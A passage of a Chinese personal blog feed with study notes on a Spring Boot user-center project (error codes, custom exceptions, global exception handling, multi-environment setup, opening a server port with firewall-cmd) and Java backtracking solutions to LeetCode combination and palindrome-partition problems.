类</strong></p><ul><li><p>用于统一定义接口返回的数据结构，包含状态码、数据、消息和描述等字段。</p></li><li><p>提供了多种构造函数，支持不同情境下的响应创建（例如成功、错误等）。</p></li><li><p><strong><code>ErrorCode</code> 枚举类</strong></p></li><li><p>将常见的错误类型抽象为枚举，定义了每种错误的状态码、消息和描述。</p></li><li><p>提供了一种集中式管理错误信息的方式，便于统一处理和维护。</p></li></ul><p><strong><code>ResultsUtils</code> 工具类</strong></p><ul><li>提供了简单的方法来快速生成<code>BaseResponse</code>对象，减少重复代码。</li><li>包含针对成功和多种错误情况的静态方法，简化了对API响应的构建。</li></ul><h4 id="依据业务逻辑写的错误码"><a href="#依据业务逻辑写的错误码" class="headerlink" title="依据业务逻辑写的错误码"></a>依据业务逻辑写的错误码</h4><p>生成文档的话最好写上注释（Javadoc）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ErrorCode</span> &#123;</span><br><span class="line"></span><br><span class="line">    PARAMS_ERROR(<span class="number">40000</span>,<span class="string">&quot;请求参数错误&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="comment">//用户问题</span></span><br><span class="line">    NULL_ERROR(<span class="number">40001</span>,<span class="string">&quot;请求数据错误&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NOT_LOGIN(<span class="number">40100</span>,<span class="string">&quot;未登录&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NO_AUTH(<span class="number">40101</span>,<span class="string">&quot;没有权限&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String description;</span><br><span class="line"></span><br><span class="line">     ErrorCode(<span class="type">int</span> code, <span class="keyword">final</span> String message, <span class="keyword">final</span> String description) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">        <span class="built_in">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>枚举值不支持set，所以直接定义为final.<br>运行时异常不用throws捕获和try-catch捕获.可以理解为description是给前端用的（给前端返回参数）</p><p><strong>定义业务异常类</strong></p><ul><li><p>相对与Java的异常类，支持更多字段</p></li><li><p>自定义构造函数，更灵活&#x2F;快捷的设置字段</p></li><li><pre><code class="java">package com.yub.usercenter.exception;import com.yub.usercenter.common.ErrorCode;/** * 自定义异常类 * * @author yub */public class BusinessException extends RuntimeException&#123;    private final int code;    private final String description;    public BusinessException(String message, int code, String description) &#123;        super(message);        this.code = code;        this.description = description;    &#125;    public BusinessException(ErrorCode errorCode) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = errorCode.getDescription();    &#125;    public BusinessException(ErrorCode errorCode, String description) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = description;    &#125;    public int getCode() &#123;        return this.code;    &#125;    public String getDescription() &#123;        return this.description;    &#125;&#125;<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**编写全局异常处理器**</span><br><span class="line"></span><br><span class="line">- 捕获代码中的所有异常，内部消化（封装），让前端得到更详细的业务报错/信息，同时屏蔽框架本身的异常（不暴露服务器内部状态）</span><br><span class="line">- 使用Spring AOP进行实现：在调用方法前后进行额外的处理</span><br><span class="line">- 集中处理，比如记录日志</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="keyword">package</span> com.yub.usercenter.exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.BaseResponse;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ErrorCode;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ResultsUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RestControllerAdvice;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 全局异常处理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GolobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(BusinessException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse businessExceotion(BusinessException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;businessException:&quot;</span> + e.getMessage(),e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(e.getCode(),e.getMessage(),e.getDescription());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse runtimeException(RuntimeException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;runtimeException:&quot;</span>,e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(ErrorCode.SYSTEM_ERROR,e.getMessage(),<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>自定义快捷键</p><p><img src="/../imgs/2025-01/image-20250120221223730.png" alt="image-20250120221223730"></p><p>$END$是输入快捷语句之后能光标能自动定位到括号位置初.</p><p><img src="/../imgs/2025-01/image-20250120221257889.png" alt="image-20250120221257889"></p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul><li>正向代理，替客户端向服务器接发送请求</li><li>反向代理，替服务器接收请求.<br><img src="/../imgs/2025-01/image-20250120214529168.png" alt="image-20250120214529168"></li></ul><p>application.yml指定接口全局api</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">servlet:</span></span><br><span class="line"><span class="attr">context-path:</span> <span class="string">/api</span></span><br></pre></td></tr></table></figure><h4 id="多环境"><a href="#多环境" class="headerlink" title="多环境"></a>多环境</h4><ul><li>指同一套项目代码在不同的阶段需要根据实际情况来调整配置并且部署到不同的机器上.</li></ul><p><strong>为什么需要</strong></p><ul><li><p>每个环境互不影响</p></li><li><p>区分不同的阶段：开发&#x2F;测试&#x2F;生产</p></li><li><p>对项目进行优化</p><ul><li>本地日志级别</li><li>精简依赖，节约项目体积</li><li>项目的环境&#x2F;参数可以调整，比如JVM参数</li></ul><p>针对不同的环境做不同的事情.</p></li></ul><p><strong>多环境分类</strong></p><ul><li>本地环境（自己的电脑）localhost</li><li>开发环境（远程开发）多人协作</li><li>测试环境（测试）开发&#x2F;测试&#x2F;产品。独立的数据库、独立的服务器</li><li>预发布环境（体验服）基本和正式环境一致，正式环境的数据库更严谨查出问题</li><li>正式环境（线上，公开访问的项目）尽量不改动，保证上线“完美”</li><li>沙箱环境（实验环境）为了做实验</li></ul><h4 id="后端多环境实战"><a href="#后端多环境实战" class="headerlink" title="后端多环境实战"></a>后端多环境实战</h4><p>SpringBoot项目通过application.yml添加不同的后缀来区分.<br><img src="/../imgs/2025-01/image-20250118153224532.png" alt="image-20250118153224532"></p><h5 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h5><h6 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h6><ol><li>有一台自己的服务器（腾讯云阿里云等）</li><li>代码打包完成，完成部署备份文件.</li></ol><h6 id="使用Linux宝塔部署"><a href="#使用Linux宝塔部署" class="headerlink" title="使用Linux宝塔部署"></a>使用Linux宝塔部署</h6><p>充值宝塔访问端口和路径后无法正常访问<img src="/../imgs/2025-01/image-20250119165712913.png" alt="image-20250119165712913"></p><p>在腾讯云防火墙放行之后还要在Linux宝塔端同步放行.（踩大坑呜呜）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查已放行端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">新增放行端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">刷新</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>做好计划，从宏观到局部，由泛到精.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;UserCenter-项目疑问记录&quot;&gt;&lt;a href=&quot;#UserCenter-项目疑问记录&quot; class=&quot;headerlink&quot; title=&quot;UserCenter 项目疑问记录&quot;&gt;&lt;/a&gt;UserCenter 项目疑问记录&lt;/h3&gt;&lt;p&gt;如何进行企业级开发?</summary>
      
    
    
    
    
    <category term="Project" scheme="https://yubut.github.io/tags/Project/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x20.</title>
    <link href="https://yubut.github.io/2024/11/27/yub%E3%81%AEAlgorithm0x20/"/>
    <id>https://yubut.github.io/2024/11/27/yub%E3%81%AEAlgorithm0x20/</id>
    <published>2024-11-27T06:08:34.000Z</published>
    <updated>2024-11-27T07:05:17.819Z</updated>
    
    <content type="html"><![CDATA[<h4 id="分割回文串"><a href="#分割回文串" class="headerlink" title="分割回文串"></a>分割回文串</h4><p>link：<a href="https://leetcode.cn/problems/palindrome-partitioning/description/">131. 分割回文串 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>主题思想是和之前做的组合II相同的，问题的关键难点就是在怎么处理切割上.<br>首先递归参数传入<strong>startIndex</strong>是表示<strong>下一轮递归遍历起始位置</strong>，那么startIndx就是作为我们的<strong>切割线</strong>一角色.<br>再看回文子串如何判断？采用双指针法，一个在头一个在尾前后指针指向位置的元素相等就是回文串了.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    Deque&lt;String&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">partition</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        backtracking(s,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String s, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//起始位置大于s的长度-&gt;找到了一组分割方案</span></span><br><span class="line">        <span class="keyword">if</span>(startIndex &gt;= s.length()) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(deque));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="comment">//记录回文串</span></span><br><span class="line">            <span class="keyword">if</span>(isPalindrome(s,startIndex,i)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.substring(startIndex,i + <span class="number">1</span>);</span><br><span class="line">                deque.addLast(str);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            backtracking(s, i + <span class="number">1</span>);</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否是回文串</span></span><br><span class="line">            <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(String s, <span class="type">int</span> startIndex, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex, j = end; i &lt; j; i++,j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(i) != s.charAt(j)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="复原ip地址"><a href="#复原ip地址" class="headerlink" title="复原ip地址"></a>复原ip地址</h4><p>link：</p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;分割回文串&quot;&gt;&lt;a href=&quot;#分割回文串&quot; class=&quot;headerlink&quot; title=&quot;分割回文串&quot;&gt;&lt;/a&gt;分割回文串&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/palindrome-part</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x19.</title>
    <link href="https://yubut.github.io/2024/11/26/yub%E3%81%AEAlgorithm.0x19/"/>
    <id>https://yubut.github.io/2024/11/26/yub%E3%81%AEAlgorithm.0x19/</id>
    <published>2024-11-26T04:06:16.000Z</published>
    <updated>2024-11-26T13:38:08.800Z</updated>
    
    <content type="html"><![CDATA[<h4 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a>组合总和</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实思路和昨天的很像，但是元素可以复用而且也不是字符串.<br>那还是依旧使用path进行记录,res进行返回结果，sum进行统计最后再加上一个标记位置进行判断即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        backstracking(candidates, target, sum, startIndex);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> sum, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">           res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            backstracking(candidates,target,sum,i);</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合总和II"><a href="#组合总和II" class="headerlink" title="组合总和II"></a>组合总和II</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-ii/description/">40. 组合总和 II - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>上一题的plus版，最开始想的是和上一题的思路相同加一个set去掉重复的集合结果会超时…（菜就多练）<br>这里就出现了一个新知识点——学会加标识辅助数组.(苦笑)<br>潦草的分析图</p><p><img src="/../imgs/2024-10/image-20241126211756826.png" alt="image-20241126211756826">我们需要额外创建一个boolean的used数组来记录当前的位置是否被用过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//标记数组</span></span><br><span class="line">    <span class="type">boolean</span>[] used;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        used = <span class="keyword">new</span> <span class="title class_">boolean</span>[candidates.length];</span><br><span class="line">        Arrays.fill(used,<span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backstracking(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target,<span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//出现重复节点 同层的第一个节点已经被访问过 pass</span></span><br><span class="line">            <span class="comment">//candidates[i] == candidates[i - 1] 就是对应[2,2]的选取情况</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backstracking(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>去掉 <code>candidates[i] == candidates[i - 1]</code>，会导致无法判断相邻重复元素，生成重复的组合.</p><p><strong>完整逻辑</strong>：</p><ul><li><code>candidates[i] == candidates[i - 1]</code>：用于识别相邻的重复元素。</li><li><code>!used[i - 1]</code>：确保同一层中，跳过未使用的重复元素。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;组合总和&quot;&gt;&lt;a href=&quot;#组合总和&quot; class=&quot;headerlink&quot; title=&quot;组合总和&quot;&gt;&lt;/a&gt;组合总和&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/combination-sum/&quot;&gt;3</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x18</title>
    <link href="https://yubut.github.io/2024/11/22/yub%E3%81%AEAlgorithm.0x18/"/>
    <id>https://yubut.github.io/2024/11/22/yub%E3%81%AEAlgorithm.0x18/</id>
    <published>2024-11-22T10:54:16.000Z</published>
    <updated>2024-11-26T04:05:25.836Z</updated>
    
    <content type="html"><![CDATA[<h4 id="组合总和III"><a href="#组合总和III" class="headerlink" title="组合总和III"></a>组合总和III</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>既然是要比对，那自然需要和目标值比对的sum，同时要记录path.<br>这么一想其实和我们之前分析的组合问题就非常相似了.<br>注意一下题目中给定的判定逻辑限制（数字1-9且不能重复）很完美的组合问题.<br>天生的回溯搭子.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//记录路径</span></span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//记录结果</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> targetSum, <span class="type">int</span> k, <span class="type">int</span> startIndex, <span class="type">int</span> sum)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;targetSum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(targetSum == sum)</span><br><span class="line">            &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意不要硬套模板 n-(k-path.size())+1 可能导致越界</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=<span class="number">9</span>-(k-path.size())+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            sum+=i;</span><br><span class="line">            backtracking(targetSum,k,i+<span class="number">1</span>,sum);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">            sum-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="电话号码数字组合"><a href="#电话号码数字组合" class="headerlink" title="电话号码数字组合"></a>电话号码数字组合</h4><p>link：<a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/description/">17. 电话号码的字母组合 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" 